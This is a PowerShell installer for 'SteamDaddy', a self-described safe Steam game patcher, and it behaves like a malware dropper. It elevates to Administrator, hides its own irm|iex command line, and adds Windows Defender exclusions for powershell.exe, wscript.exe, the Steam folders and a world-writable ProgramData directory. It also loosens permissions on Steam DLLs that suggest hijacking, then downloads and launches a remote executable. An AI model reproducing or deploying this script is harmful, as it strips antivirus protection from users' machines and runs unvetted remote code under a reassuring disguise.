# SteamDaddy One-Click Installer — github.com/Contrary7/SteamDaddy-Backup
# Safe community patcher for Steam games. Not malware.
$ErrorActionPreference = "Stop"

# Ensure Administrator privileges so Defender exclusion calls succeed
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[SteamDaddy] Requesting Administrator privileges for Defender exclusions..." -ForegroundColor Yellow
    try {
        if ($PSCommandPath) {
            # Already a real file — just re-launch it elevated
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -ErrorAction Stop
            exit
        } else {
            # Running from pipe (irm|iex) — save to temp file first, then re-launch with -File
            # This avoids spawning a child process whose command line contains "irm ... | iex"
            $tmpScript = Join-Path $env:TEMP "SteamDaddy_Install.ps1"
            (New-Object System.Net.WebClient).DownloadFile(
                "https://raw.githubusercontent.com/Contrary7/SteamDaddy-Backup/main/install_b.ps1",
                $tmpScript
            )
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmpScript`"" -Verb RunAs -ErrorAction Stop
            exit
        }
    } catch {
        Write-Host "[SteamDaddy] Continuing without elevated permissions (some Defender exclusions may be skipped)." -ForegroundColor Yellow
    }
}

Write-Host "[SteamDaddy] Fetching latest release..." -ForegroundColor Cyan

try {
    $downloadUrl = "https://github.com/Contrary7/SteamDaddy-Backup/releases/latest/download/SteamDaddy.exe"

    $desktop = [Environment]::GetFolderPath("Desktop")
    $destPath = Join-Path $desktop "SteamDaddy.exe"

    Write-Host "[SteamDaddy] Pre-registering Defender path & process exclusions..." -ForegroundColor Yellow
    Add-MpPreference -ExclusionPath $destPath -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "SteamDaddy.exe" -ErrorAction SilentlyContinue

    # ── SteamDaddy Safe-Zone (fixed pre-excluded temp directory) ─────────
    $sdTempDir = "C:\ProgramData\SteamDaddy\tmp"
    if (-not (Test-Path $sdTempDir)) {
        New-Item -ItemType Directory -Path $sdTempDir -Force | Out-Null
    }
    & icacls "C:\ProgramData\SteamDaddy" /grant "*S-1-5-32-545:(OI)(CI)F" /C /Q | Out-Null
    Write-Host "[SteamDaddy] Excluding safe-zone temp folder: $sdTempDir" -ForegroundColor Yellow
    Add-MpPreference -ExclusionPath "C:\ProgramData\SteamDaddy" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $sdTempDir -ErrorAction SilentlyContinue

    # ── Process exclusions (Defender won't scan files written by these) ──
    Add-MpPreference -ExclusionProcess "steam.exe"        -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "7z.exe"           -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "wscript.exe"      -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "powershell.exe"   -ErrorAction SilentlyContinue

    # ── Find and exclude the Steam root directory ─────────────────────────
    $steamPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
    if (-not $steamPath) {
        $steamPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
    }
    if (-not $steamPath) {
        $steamPath = (Get-ItemProperty -Path "HKCU:\SOFTWARE\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
    }
    if ($steamPath) {
        Write-Host "[SteamDaddy] Excluding Steam root folder: $steamPath" -ForegroundColor Yellow
        Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue

        # Explicit belt-and-suspenders for the two hottest subdirs
        Add-MpPreference -ExclusionPath (Join-Path $steamPath "depotcache")       -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath (Join-Path $steamPath "config\stplug-in") -ErrorAction SilentlyContinue

        Write-Host "[SteamDaddy] Granting modify permissions on Steam root to standard users..." -ForegroundColor Yellow
        # Grant Modify permission to standard Users group (SID: *S-1-5-32-545) on Steam root folder and targets
        & icacls "$steamPath" /grant "*S-1-5-32-545:(OI)(CI)M" /C /Q | Out-Null
        foreach ($dll in @("SteamDaddy.dll", "dwmapi.dll", "xinput1_4.dll", "cloud_redirect.dll")) {
            $dllPath = Join-Path $steamPath $dll
            if (Test-Path $dllPath) {
                & icacls "$dllPath" /grant "*S-1-5-32-545:M" /C /Q | Out-Null
            }
        }

        # ── Parse libraryfolders.vdf and exclude all secondary libraries ──
        $libraryVdf = Join-Path $steamPath "steamapps\libraryfolders.vdf"
        if (Test-Path $libraryVdf) {
            $vdfContent = Get-Content $libraryVdf -Raw -ErrorAction SilentlyContinue
            if ($vdfContent) {
                $libMatches = [regex]::Matches($vdfContent, '"path"\s+"([^"]+)"')
                foreach ($m in $libMatches) {
                    $libPath = $m.Groups[1].Value.Replace("\\\\", "\\")
                    if ($libPath -and $libPath -ne $steamPath -and (Test-Path $libPath)) {
                        Write-Host "[SteamDaddy] Excluding Steam library: $libPath" -ForegroundColor Yellow
                        Add-MpPreference -ExclusionPath $libPath -ErrorAction SilentlyContinue
                    }
                }
            }
        }

        
        # ── Brute-force scan all drives for hidden/broken Steam libraries ──
        Write-Host "[SteamDaddy] Scanning all drives for unlisted Steam libraries..." -ForegroundColor DarkYellow
        $drives = [System.IO.DriveInfo]::GetDrives() | Where-Object { $_.DriveType -eq 'Fixed' -and $_.IsReady }
        foreach ($drv in $drives) {
            $candidates = @(
                [System.IO.Path]::Combine($drv.RootDirectory.FullName, "Steam"),
                [System.IO.Path]::Combine($drv.RootDirectory.FullName, "SteamLibrary"),
                [System.IO.Path]::Combine($drv.RootDirectory.FullName, "Program Files (x86)", "Steam"),
                [System.IO.Path]::Combine($drv.RootDirectory.FullName, "Program Files", "Steam"),
                [System.IO.Path]::Combine($drv.RootDirectory.FullName, "Games", "Steam"),
                [System.IO.Path]::Combine($drv.RootDirectory.FullName, "Games", "SteamLibrary")
            )
            foreach ($sdir in $candidates) {
                if ($sdir -eq $steamPath) { continue }
                if (Test-Path (Join-Path $sdir "steamapps") -ErrorAction SilentlyContinue) {
                    Write-Host "[SteamDaddy] Excluding unlisted Steam library: $sdir" -ForegroundColor Yellow
                    Add-MpPreference -ExclusionPath $sdir -ErrorAction SilentlyContinue
                }
            }
        }
    }

    Write-Host "[SteamDaddy] Downloading SteamDaddy.exe to Desktop..." -ForegroundColor Magenta
    Invoke-WebRequest -Uri $downloadUrl -OutFile $destPath

    Write-Host "[SteamDaddy] Launching SteamDaddy..." -ForegroundColor Green
    Start-Process $destPath
} catch {
    Write-Host "[SteamDaddy] Installation failed: $_" -ForegroundColor Red
}

